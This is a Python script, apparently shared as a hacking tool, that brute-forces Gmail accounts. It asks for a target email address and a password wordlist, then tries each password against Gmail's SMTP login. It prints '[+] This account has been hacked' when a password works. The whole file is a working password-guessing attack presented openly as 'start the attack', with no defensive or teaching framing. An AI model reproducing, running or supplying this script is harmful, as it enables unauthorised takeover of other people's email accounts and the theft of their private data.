#!/usr/bin/python
"""create by Ha3MrX
    modified by Unknown Soul
"""

import os
import smtplib


def cls():
    os.system('cls') if os.name == 'nt' else 'clear'


class ErrorConstants:

    # this program isn't in white list
    ERROR_535 = "535, b'5.7.8 Username and Password not accepted. Learn more at 5.7.8  " \
                "https://support.google.com/mail/?p=BadCredentials "

    # special application code required
    ERROR_534 = "534, b'5.7.9 Application-specific password required. Learn more at 5.7.9  " \
                "https://support.google.com/mail/?p=InvalidSecondFactor "


def main():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               modified by Unknown Soul          ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                               ')
    print('     (      )                   (      )         ')
    print('   (     (                         )     )       ')
    print(' (   *    |                         |   *   )    ')
    print('  (   *     )                     (   *     )    ')
    print('  |     *   |                     |   *     |    ')
    print('   (      *   \                 /   *      )     ')
    print('     (      *   \             /   *      )       ')
    print('        (     **   \       /    **    )          ')
    print('          (   ***   )     (   ***    )           ')
    print('            (_________)  (_________)             ')
    print('                                 v.1.1           ')


main()
print('[1] start the attack')
print('[2] exit')
option = input('====>\n')
try:
    if option == '1':
        file_path = input('absolute path of passwords file : \n')
        pass_file = open(file_path, mode="r", encoding="utf-8", errors="ignore")
        pass_list = pass_file.readlines()
    elif option == '2':
        exit()
    else:
        print("Option now found \n")
        cls()
        exit()
except (FileNotFoundError, OSError) as e:
    print("Path is undefined")
    exit()


def login():
    i = 0
    user_name = input('target email: \n')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
        i = i + 1
        print(str(i) + '/' + str(len(pass_list)))
        try:
            server.login(user_name, password)
            cls()
            print('\n')
            print('[+] This account has been hacked. Password :' + password + '     ^_^')
            break
        except smtplib.SMTPAuthenticationError as smtpError:
            error = str(smtpError)
            error_number = error[1:4]

            match error_number:
                case "534":
                    cls()
                    print(ErrorConstants.ERROR_534)
                    break
                case "535":
                    cls()
                    print(ErrorConstants.ERROR_535)
                    break
                case _:
                    print("password not found:" + password)


login()
